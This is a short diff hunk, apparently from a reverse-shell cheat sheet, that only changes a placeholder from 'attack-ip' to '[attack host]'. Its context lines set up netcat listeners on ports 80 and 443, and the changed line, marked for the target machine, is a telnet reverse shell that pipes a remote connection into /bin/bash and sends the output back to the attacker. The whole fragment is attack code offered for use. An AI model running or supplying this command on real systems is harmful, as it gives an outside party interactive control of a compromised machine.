@@ -18,5 +18,5 @@ nc -l -n -v -p 80
 nc -l -n -v -p 443
 
 # On the target machine:
-telnet attack-ip 80 | /bin/bash | telnet attack-ip
+telnet [attack host] 80 | /bin/bash | telnet [attack host]
 
